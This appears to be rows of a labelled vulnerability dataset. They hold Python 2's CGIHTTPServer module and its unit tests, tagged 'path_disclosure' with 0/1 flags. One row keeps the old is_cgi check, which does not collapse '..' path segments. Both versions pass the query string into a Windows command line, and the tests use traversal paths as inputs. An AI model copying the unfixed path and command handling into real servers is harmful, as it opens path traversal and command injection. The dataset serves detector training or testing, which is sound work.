        @param maxiter: scaling factor for the number of iterations to be used in the
            approximate calculation of eigenvectors and eigenvalues. The number of iterations
            passed to scipy's underlying eigs function will be n*maxiter where n is the
            number of rows/columns of the Laplacian matrix.
        """"""

        if _sparse.issparse(A) == False:
            raise TypeError(""A must be a sparse matrix"")

        # NOTE: ncv sets additional auxiliary eigenvectors that are computed
        # NOTE: in order to be more confident to find the one with the largest
        # NOTE: magnitude, see https://github.com/scipy/scipy/issues/4987
        w, pi = _sla.eigs(A, k=1, which=""LM"", ncv=lanczosVecs, maxiter=maxiter)
        pi = pi.reshape(pi.size,)
        if normalized:
            pi /= sum(pi)
        return pi


    def getLaplacianMatrix(self, includeSubPaths=True):
        """"""
        Returns the transposed Laplacian matrix corresponding to the higher-order network.

        @param includeSubpaths: Whether or not subpath statistics shall be included in the
            calculation of matrix weights
        """"""

        T = self.getTransitionMatrix(includeSubPaths)
        I = _sparse.identity(self.vcount())

        return I-T
/n/n/n",1,path_disclosure
8,4,923ba361d8f757f0656cfd216525aca4848e02aa,"Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script.

        Returns True and updates the cgi_info attribute to the tuple
        (dir, rest) if self.path requires running a CGI script.
        Returns False otherwise.

        The default implementation tests whether the normalized url
        path begins with one of the strings in self.cgi_directories
        (and the next character is a '/' or the end of the string).
        """"""
        splitpath = _url_collapse_path_split(self.path)
        if splitpath[0] in self.cgi_directories:
            self.cgi_info = splitpath
            return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


# TODO(gregory.p.smith): Move this into an appropriate library.
def _url_collapse_path_split(path):
    """"""
    Given a URL path, remove extra '/'s and '.' path elements and collapse
    any '..' references.

    Implements something akin to RFC-2396 5.2 step 6 to parse relative paths.

    Returns: A tuple of (head, tail) where tail is everything after the final /
    and head is everything before it.  Head will always start with a '/' and,
    if it contains anything else, never have a trailing '/'.

    Raises: IndexError if too many '..' occur within the path.
    """"""
    # Similar to os.path.split(os.path.normpath(path)) but specific to URL
    # path semantics rather than local operating system semantics.
    path_parts = []
    for part in path.split('/'):
        if part == '.':
            path_parts.append('')
        else:
            path_parts.append(part)
    # Filter out blank non trailing parts before consuming the '..'.
    path_parts = [part for part in path_parts[:-1] if part] + path_parts[-1:]
    if path_parts:
        tail_part = path_parts.pop()
    else:
        tail_part = ''
    head_parts = []
    for part in path_parts:
        if part == '..':
            head_parts.pop()
        else:
            head_parts.append(part)
    if tail_part and tail_part == '..':
        head_parts.pop()
        tail_part = ''
    return ('/' + '/'.join(head_parts), tail_part)


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/nLib/test/test_httpservers.py/n/n""""""Unittests for the various HTTPServer modules.

Written by Cody A.W. Somerville <cody-somerville@ubuntu.com>,
Josip Dzolonga, and Michael Otteneder for the 2007/08 GHOP contest.
""""""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from CGIHTTPServer import CGIHTTPRequestHandler
import CGIHTTPServer

import os
import sys
import base64
import shutil
import urllib
import httplib
import tempfile
import threading

import unittest
from test import test_support


class NoLogRequestHandler:
    def log_message(self, *args):
        # don't write log messages to stderr
        pass


class TestServerThread(threading.Thread):
    def __init__(self, test_object, request_handler):
        threading.Thread.__init__(self)
        self.request_handler = request_handler
        self.test_object = test_object
        self.test_object.lock.acquire()

    def run(self):
        self.server = HTTPServer(('', 0), self.request_handler)
        self.test_object.PORT = self.server.socket.getsockname()[1]
        self.test_object.lock.release()
        try:
            self.server.serve_forever()
        finally:
            self.server.server_close()

    def stop(self):
        self.server.shutdown()


class BaseTestCase(unittest.TestCase):
    def setUp(self):
        self.lock = threading.Lock()
        self.thread = TestServerThread(self, self.request_handler)
        self.thread.start()
        self.lock.acquire()

    def tearDown(self):
        self.lock.release()
        self.thread.stop()

    def request(self, uri, method='GET', body=None, headers={}):
        self.connection = httplib.HTTPConnection('localhost', self.PORT)
        self.connection.request(method, uri, body, headers)
        return self.connection.getresponse()


class BaseHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, BaseHTTPRequestHandler):
        protocol_version = 'HTTP/1.1'
        default_request_version = 'HTTP/1.1'

        def do_TEST(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

        def do_KEEP(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()

        def do_KEYERROR(self):
            self.send_error(999)

        def do_CUSTOM(self):
            self.send_response(999)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

    def setUp(self):
        BaseTestCase.setUp(self)
        self.con = httplib.HTTPConnection('localhost', self.PORT)
        self.con.connect()

    def test_command(self):
        self.con.request('GET', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_request_line_trimming(self):
        self.con._http_vsn_str = 'HTTP/1.1\n'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_bogus(self):
        self.con._http_vsn_str = 'FUBAR'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_digits(self):
        self.con._http_vsn_str = 'HTTP/9.9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_none_get(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_none(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('PUT', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_invalid(self):
        self.con._http_vsn = 99
        self.con._http_vsn_str = 'HTTP/9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 505)

    def test_send_blank(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('', '')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_header_close(self):
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'close')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_head_keep_alive(self):
        self.con._http_vsn_str = 'HTTP/1.1'
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'keep-alive')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_handler(self):
        self.con.request('TEST', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 204)

    def test_return_header_keep_alive(self):
        self.con.request('KEEP', '/')
        res = self.con.getresponse()
        self.assertEquals(res.getheader('Connection'), 'keep-alive')
        self.con.request('TEST', '/')

    def test_internal_key_error(self):
        self.con.request('KEYERROR', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)

    def test_return_custom_status(self):
        self.con.request('CUSTOM', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)


class SimpleHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, SimpleHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.cwd = os.getcwd()
        basetempdir = tempfile.gettempdir()
        os.chdir(basetempdir)
        self.data = 'We are the knights who say Ni!'
        self.tempdir = tempfile.mkdtemp(dir=basetempdir)
        self.tempdir_name = os.path.basename(self.tempdir)
        temp = open(os.path.join(self.tempdir, 'test'), 'wb')
        temp.write(self.data)
        temp.close()

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            try:
                shutil.rmtree(self.tempdir)
            except:
                pass
        finally:
            BaseTestCase.tearDown(self)

    def check_status_and_reason(self, response, status, data=None):
        body = response.read()
        self.assert_(response)
        self.assertEquals(response.status, status)
        self.assert_(response.reason != None)
        if data:
            self.assertEqual(data, body)

    def test_get(self):
        #constructs the path relative to the root directory of the HTTPServer
        response = self.request(self.tempdir_name + '/test')
        self.check_status_and_reason(response, 200, data=self.data)
        response = self.request(self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        response = self.request(self.tempdir_name)
        self.check_status_and_reason(response, 301)
        response = self.request('/ThisDoesNotExist')
        self.check_status_and_reason(response, 404)
        response = self.request('/' + 'ThisDoesNotExist' + '/')
        self.check_status_and_reason(response, 404)
        f = open(os.path.join(self.tempdir_name, 'index.html'), 'w')
        response = self.request('/' + self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        if os.name == 'posix':
            # chmod won't work as expected on Windows platforms
            os.chmod(self.tempdir, 0)
            response = self.request(self.tempdir_name + '/')
            self.check_status_and_reason(response, 404)
            os.chmod(self.tempdir, 0755)

    def test_head(self):
        response = self.request(
            self.tempdir_name + '/test', method='HEAD')
        self.check_status_and_reason(response, 200)
        self.assertEqual(response.getheader('content-length'),
                         str(len(self.data)))
        self.assertEqual(response.getheader('content-type'),
                         'application/octet-stream')

    def test_invalid_requests(self):
        response = self.request('/', method='FOO')
        self.check_status_and_reason(response, 501)
        # requests must be case sensitive,so this should fail too
        response = self.request('/', method='get')
        self.check_status_and_reason(response, 501)
        response = self.request('/', method='GETs')
        self.check_status_and_reason(response, 501)


cgi_file1 = """"""\
#!%s

print ""Content-type: text/html""
print
print ""Hello World""
""""""

cgi_file2 = """"""\
#!%s
import cgi

print ""Content-type: text/html""
print

form = cgi.FieldStorage()
print ""%%s, %%s, %%s"" %% (form.getfirst(""spam""), form.getfirst(""eggs""),\
              form.getfirst(""bacon""))
""""""

class CGIHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, CGIHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.parent_dir = tempfile.mkdtemp()
        self.cgi_dir = os.path.join(self.parent_dir, 'cgi-bin')
        os.mkdir(self.cgi_dir)

        self.file1_path = os.path.join(self.cgi_dir, 'file1.py')
        with open(self.file1_path, 'w') as file1:
            file1.write(cgi_file1 % sys.executable)
        os.chmod(self.file1_path, 0777)

        self.file2_path = os.path.join(self.cgi_dir, 'file2.py')
        with open(self.file2_path, 'w') as file2:
            file2.write(cgi_file2 % sys.executable)
        os.chmod(self.file2_path, 0777)

        self.cwd = os.getcwd()
        os.chdir(self.parent_dir)

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            os.remove(self.file1_path)
            os.remove(self.file2_path)
            os.rmdir(self.cgi_dir)
            os.rmdir(self.parent_dir)
        finally:
            BaseTestCase.tearDown(self)

    def test_url_collapse_path_split(self):
        test_vectors = {
            '': ('/', ''),
            '..': IndexError,
            '/.//..': IndexError,
            '/': ('/', ''),
            '//': ('/', ''),
            '/\\': ('/', '\\'),
            '/.//': ('/', ''),
            'cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            '/cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            'a': ('/', 'a'),
            '/a': ('/', 'a'),
            '//a': ('/', 'a'),
            './a': ('/', 'a'),
            './C:/': ('/C:', ''),
            '/a/b': ('/a', 'b'),
            '/a/b/': ('/a/b', ''),
            '/a/b/c/..': ('/a/b', ''),
            '/a/b/c/../d': ('/a/b', 'd'),
            '/a/b/c/../d/e/../f': ('/a/b/d', 'f'),
            '/a/b/c/../d/e/../../f': ('/a/b', 'f'),
            '/a/b/c/../d/e/.././././..//f': ('/a/b', 'f'),
            '../a/b/c/../d/e/.././././..//f': IndexError,
            '/a/b/c/../d/e/../../../f': ('/a', 'f'),
            '/a/b/c/../d/e/../../../../f': ('/', 'f'),
            '/a/b/c/../d/e/../../../../../f': IndexError,
            '/a/b/c/../d/e/../../../../f/..': ('/', ''),
        }
        for path, expected in test_vectors.iteritems():
            if isinstance(expected, type) and issubclass(expected, Exception):
                self.assertRaises(expected,
                                  CGIHTTPServer._url_collapse_path_split, path)
            else:
                actual = CGIHTTPServer._url_collapse_path_split(path)
                self.assertEquals(expected, actual,
                                  msg='path = %r\nGot:    %r\nWanted: %r' % (
                                  path, actual, expected))

    def test_headers_and_content(self):
        res = self.request('/cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_post(self):
        params = urllib.urlencode({'spam' : 1, 'eggs' : 'python', 'bacon' : 123456})
        headers = {'Content-type' : 'application/x-www-form-urlencoded'}
        res = self.request('/cgi-bin/file2.py', 'POST', params, headers)

        self.assertEquals(res.read(), '1, python, 123456\n')

    def test_invaliduri(self):
        res = self.request('/cgi-bin/invalid')
        res.read()
        self.assertEquals(res.status, 404)

    def test_authorization(self):
        headers = {'Authorization' : 'Basic %s' % \
                base64.b64encode('username:pass')}
        res = self.request('/cgi-bin/file1.py', 'GET', headers=headers)
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_no_leading_slash(self):
        # http://bugs.python.org/issue2254
        res = self.request('cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200),
             (res.read(), res.getheader('Content-type'), res.status))


def test_main(verbose=None):
    try:
        cwd = os.getcwd()
        test_support.run_unittest(BaseHTTPServerTestCase,
                                  SimpleHTTPServerTestCase,
                                  CGIHTTPServerTestCase
                                  )
    finally:
        os.chdir(cwd)

if __name__ == '__main__':
    test_main()
/n/n/n",0,path_disclosure
9,5,923ba361d8f757f0656cfd216525aca4848e02aa,"/Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script,
        and return a boolean.

        This function sets self.cgi_info to a tuple (dir, rest)
        when it returns True, where dir is the directory part before
        the CGI script name.  Note that rest begins with a
        slash if it is not empty.

        The default implementation tests whether the path
        begins with one of the strings in the list
        self.cgi_directories (and the next character is a '/'
        or the end of the string).
        """"""

        path = self.path

        for x in self.cgi_directories:
            i = len(x)
            if path[:i] == x and (not path[i:] or path[i] == '/'):
                self.cgi_info = path[:i], path[i+1:]
                return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
